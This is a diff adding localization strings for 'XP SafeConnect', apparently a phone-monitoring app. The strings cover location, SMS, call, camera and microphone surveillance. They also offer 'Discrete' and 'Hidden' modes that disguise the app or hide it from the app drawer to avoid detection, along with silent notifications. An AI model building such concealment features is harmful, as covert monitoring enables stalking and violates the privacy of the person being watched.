@@ -1,0 +1,192 @@
+{
+  "appName": "XP SafeConnect",
+  
+  "welcomeToSafeConnect": "Welcome to XP SafeConnect",
+  "pairingScreenDescription": "Please enter the pairing code provided by the monitoring device to start the setup process.",
+  "pairingCode": "Pairing Code",
+  "enterPairingCode": "Enter the 6-digit code",
+  "pairingCodeRequired": "Please enter the pairing code",
+  "continueText": "Continue",
+  "cancel": "Cancel",
+  "exitSetup": "Exit Setup",
+  "exitSetupConfirmation": "Are you sure you want to exit the setup? This will close the application.",
+  "exit": "Exit",
+  
+  "requiredPermissions": "Required Permissions",
+  "permissionTitle": "{title}",
+  "@permissionTitle": {
+    "placeholders": {
+      "title": {
+        "type": "String"
+      }
+    }
+  },
+  "permissionDescription": "{description}",
+  "@permissionDescription": {
+    "placeholders": {
+      "description": {
+        "type": "String"
+      }
+    }
+  },
+  "locationPermission": "Location",
+  "locationPermissionDescription": "Allows tracking of your device's location in real-time. This is required for the monitoring device to see where you are.",
+  "smsPermission": "SMS Messages",
+  "smsPermissionDescription": "Allows access to SMS messages sent and received on this device.",
+  "phonePermission": "Phone Calls",
+  "phonePermissionDescription": "Allows monitoring of incoming and outgoing calls on this device.",
+  "storagePermission": "Storage",
+  "storagePermissionDescription": "Allows access to images and other files stored on this device.",
+  "cameraPermission": "Camera",
+  "cameraPermissionDescription": "Allows remote capture of photos using this device's camera when requested.",
+  "microphonePermission": "Microphone",
+  "microphonePermissionDescription": "Allows remote audio recording using this device's microphone when requested.",
+  "requiredPermission": "Required",
+  "permissionGranted": "Permission granted",
+  "permissionRequired": "Permission required",
+  "grantPermission": "Grant Permission",
+  "back": "Back",
+  "continueToSetup": "Continue to Setup",
+  
+  "finalSetup": "Final Setup",
+  "permissionsGranted": "Permissions Granted!",
+  "displayMode": "Display Mode",
+  "displayModeNormal": "Normal",
+  "displayModeNormalDesc": "The app icon and name will be visible in the app drawer.",
+  "displayModeDiscrete": "Discrete",
+  "displayModeDiscreteDesc": "The app will use a generic name and icon to avoid detection.",
+  "displayModeHidden": "Hidden",
+  "displayModeHiddenDesc": "The app will not appear in the app drawer (access via phone dial code).",
+  "autoStart": "Auto-Start",
+  "autoStartDescription": "Automatically start the app when the device boots up.",
+  "notificationMode": "Notification Mode",
+  "notificationModeVisible": "Visible",
+  "notificationModeVisibleDesc": "Normal notifications with app name and icon.",
+  "notificationModeMinimized": "Minimized",
+  "notificationModeMinimizedDesc": "Compact notifications with minimal information.",
+  "notificationModeHidden": "Hidden",
+  "notificationModeHiddenDesc": "No visible notifications (background service only).",
+  "importantInfo": "Important Information",
+  "backgroundServiceInfo": "This app will run continuously in the background to provide monitoring capabilities. This may affect battery life. The background service will automatically restart if terminated.",
+  "finishSetup": "Finish Setup",
+  "errorOccurred": "Error Occurred",
+  "close": "Close",
+  
+  "settings": "Settings",
+  "connected": "Connected",
+  "disconnected": "Disconnected",
+  "connectedToDevice": "Connected to {device}",
+  "@connectedToDevice": {
+    "placeholders": {
+      "device": {
+        "type": "String"
+      }
+    }
+  },
+  "notConnectedToAnyDevice": "Not connected to any monitoring device",
+  "monitoringStatus": "Monitoring Status",
+  "locationTracking": "Location Tracking",
+  "messageMonitoring": "Message Monitoring",
+  "callsMonitoring": "Calls Monitoring",
+  "appsMonitoring": "Apps Monitoring",
+  "photosAccess": "Photos Access",
+  "quickActions": "Quick Actions",
+  "viewSharedData": "View Shared Data",
+  "contactMonitor": "Contact Monitor",
+  "featureComingSoon": "This feature is coming soon",
+  "holdForEmergency": "Hold for Emergency",
+  "featureActiveAndSharing": "{feature} is active and sharing data",
+  "@featureActiveAndSharing": {
+    "placeholders": {
+      "feature": {
+        "type": "String"
+      }
+    }
+  },
+  "featureNotActive": "{feature} is not active",
+  "@featureNotActive": {
+    "placeholders": {
+      "feature": {
+        "type": "String"
+      }
+    }
+  },
+  
+  "sharedData": "Shared Data",
+  "aboutSharedData": "About Shared Data",
+  "sharedDataExplanation": "This screen shows you what data is being shared with the monitoring device. You cannot disable these features as they are part of the monitoring agreement.",
+  "location": "Location",
+  "messages": "Messages",
+  "calls": "Calls",
+  "apps": "Apps",
+  "photos": "Photos",
+  "active": "Active",
+  "inactive": "Inactive",
+  "lastSyncTime": "Last sync: {time}",
+  "@lastSyncTime": {
+    "placeholders": {
+      "time": {
+        "type": "String"
+      }
+    }
+  },
+  "viewPrivacyPolicy": "View Privacy Policy",
+  "locationSharingDescription": "Your current location is being shared with the monitoring device in real-time. This includes your GPS coordinates, accuracy, and movement speed.",
+  "messagesSharingDescription": "Your SMS messages and some messaging apps content are being shared with the monitoring device.",
+  "callsSharingDescription": "Information about your incoming and outgoing calls is being shared, including the phone number, contact name, and call duration.",
+  "appsSharingDescription": "Information about apps you use and how long you use them is being shared with the monitoring device.",
+  "photosSharingDescription": "Photos access is currently not enabled on this device.",
+  
+  "emergencyMode": "Emergency Mode",
+  "emergencyModeActive": "EMERGENCY MODE ACTIVE",
+  "emergencyModeDescription": "In an emergency situation, tap the button below to alert the monitoring device. They will be notified immediately and can take appropriate action.",
+  "tapToActivate": "Tap to Activate",
+  "emergencyModeWarning": "Only use this in case of a genuine emergency. False alarms may result in restriction of this feature.",
+  "activatingEmergencyIn": "Activating emergency mode in {seconds}s",
+  "@activatingEmergencyIn": {
+    "placeholders": {
+      "seconds": {
+        "type": "String"
+      }
+    }
+  },
+  "cancelEmergency": "Cancel",
+  "tapToCancelEmergency": "Tap to cancel emergency activation",
+  "emergencyModeActivated": "Emergency Mode Activated",
+  "monitoringDeviceNotified": "The monitoring device has been notified of your emergency situation.",
+  "emergencyActions": "Emergency Actions",
+  "takePhoto": "Take Photo",
+  "recordAudio": "Record Audio",
+  "sendMessage": "Send Message",
+  "deactivateEmergencyMode": "Deactivate Emergency Mode",
+  
+  "justNow": "just now",
+  "minutesAgo": "{minutes} minutes ago",
+  "@minutesAgo": {
+    "placeholders": {
+      "minutes": {
+        "type": "String"
+      }
+    }
+  },
+  "hoursAgo": "{hours} hours ago",
+  "@hoursAgo": {
+    "placeholders": {
+      "hours": {
+        "type": "String"
+      }
+    }
+  },
+  "daysAgo": "{days} days ago",
+  "@daysAgo": {
+    "placeholders": {
+      "days": {
+        "type": "String"
+      }
+    }
+  },
+  
+  "remoteUnlockRequested": "Remote unlock requested",
+  "deviceUnlocked": "Device unlocked",
+  "unlockPermissionRequired": "This application needs permission to unlock your device"
+}
